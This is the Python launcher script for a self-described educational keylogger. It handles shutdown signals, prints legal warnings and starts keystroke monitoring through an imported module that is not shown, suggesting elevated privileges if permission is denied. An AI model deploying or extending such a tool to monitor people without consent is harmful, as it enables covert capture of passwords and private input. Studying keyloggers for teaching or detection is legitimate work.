#!/usr/bin/env python3
"""
Main entry point for the Keylogger application.
Handles signal processing and graceful shutdown.
"""

import logging
import signal
import sys
from typing import Optional

from termcolor import colored

from keylogger import Keylogger

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class KeyloggerController:
    """
    Controller class for managing the keylogger lifecycle.
    Handles startup, shutdown, and signal processing.
    """

    def __init__(self):
        """Initialize the controller and keylogger instance."""
        self.keylogger: Optional[Keylogger] = None
        self._register_signal_handlers()

    def _register_signal_handlers(self) -> None:
        """Register signal handlers for graceful shutdown."""
        # Handle Ctrl+C (SIGINT)
        signal.signal(signal.SIGINT, self._handle_shutdown_signal)

        # Handle termination signal (SIGTERM)
        if hasattr(signal, "SIGTERM"):
            signal.signal(signal.SIGTERM, self._handle_shutdown_signal)

        logger.debug("Signal handlers registered successfully")

    def _handle_shutdown_signal(self, signum: int, frame) -> None:
        """
        Handle shutdown signals for graceful exit.

        Args:
            signum: Signal number received
            frame: Current stack frame
        """
        signal_name = (
            signal.Signals(signum).name
            if hasattr(signal, "Signals")
            else f"Signal {signum}"
        )

        print(
            colored(
                f"\n[!] {signal_name} received. Shutting down gracefully...", "yellow"
            )
        )

        if self.keylogger:
            self.keylogger.shutdown()

        print(colored("[✓] Shutdown complete. Exiting...", "green"))
        sys.exit(0)

    def display_banner(self) -> None:
        """Display application banner and warnings."""
        banner = """
╔══════════════════════════════════════════════════════════╗
║               KEYLOGGER APPLICATION                      ║
║               Educational Purpose Only                   ║
╚══════════════════════════════════════════════════════════╝
        """

        warnings = [
            ("WARNING:", "red", ["bold"]),
            ("This tool is for educational purposes only!", "yellow", ["bold"]),
            ("Unauthorized monitoring is illegal and unethical.", "yellow", []),
            ("Always obtain explicit permission before use.", "yellow", []),
            ("", "white", []),
            ("Press Ctrl+C to stop the keylogger", "cyan", []),
            ("", "white", []),
        ]

        print(colored(banner, "cyan"))

        for text, color, attrs in warnings:
            if text:
                print(colored(text, color, attrs=attrs))

    def run(self) -> None:
        """Run the keylogger application."""
        try:
            # Display banner and warnings
            self.display_banner()

            # Initialize and start keylogger
            logger.info("Initializing keylogger...")
            self.keylogger = Keylogger()

            logger.info("Starting keylogger monitoring...")
            print(colored("[✓] Keylogger started successfully", "green"))
            print(colored("[i] Monitoring keystrokes...", "cyan"))

            self.keylogger.start()

        except PermissionError as e:
            logger.error(f"Permission denied: {e}")
            print(
                colored(
                    "[✗] Error: Insufficient permissions. Try running with sudo/administrator rights.",
                    "red",
                    attrs=["bold"],
                )
            )
            sys.exit(1)

        except ImportError as e:
            logger.error(f"Missing dependency: {e}")
            print(
                colored(
                    f"[✗] Error: Missing required dependency - {e}",
                    "red",
                    attrs=["bold"],
                )
            )
            print(
                colored(
                    "[i] Install dependencies: pip install pynput termcolor", "yellow"
                )
            )
            sys.exit(1)

        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            print(colored(f"[✗] Unexpected error: {e}", "red", attrs=["bold"]))
            sys.exit(1)


def main():
    """Main entry point of the application."""
    controller = KeyloggerController()
    controller.run()


if __name__ == "__main__":
    main()
